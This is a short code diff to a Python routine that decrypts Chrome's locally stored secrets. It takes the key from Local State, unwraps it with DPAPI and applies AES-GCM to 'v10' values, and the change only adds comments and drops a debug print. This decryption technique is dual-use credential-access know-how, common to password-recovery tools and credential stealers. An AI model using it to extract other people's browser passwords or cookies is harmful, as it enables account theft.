@@ -73,8 +73,10 @@ def get_key_from_local_state():
 def aes_decrypt(encrypted):
     encoded_key = (get_key_from_local_state())
     encrypted_key = base64.b64decode(encoded_key.encode())
+    #remove prefix 'DPAPI'
     encrypted_key = encrypted_key[5:]
     key = dpapi_decrypt(encrypted_key)
+    #get nonce. ignore prefix 'v10', length is 12 bytes.
     nonce = encrypted[3:15]
     cipher = aesgcm.get_cipher(key)
     return aesgcm.decrypt(cipher,encrypted[15:],nonce)
@@ -85,7 +87,6 @@ def chrome_decrypt(encrypted):
             if encrypted[:4] == b'\x01\x00\x00\x00':
                 return dpapi_decrypt(encrypted).decode()
             elif encrypted[:3] == b'v10':
-                print("d:",encrypted[-16:])
                 return aes_decrypt(encrypted)[:-16].decode()
         except WindowsError:
             return None
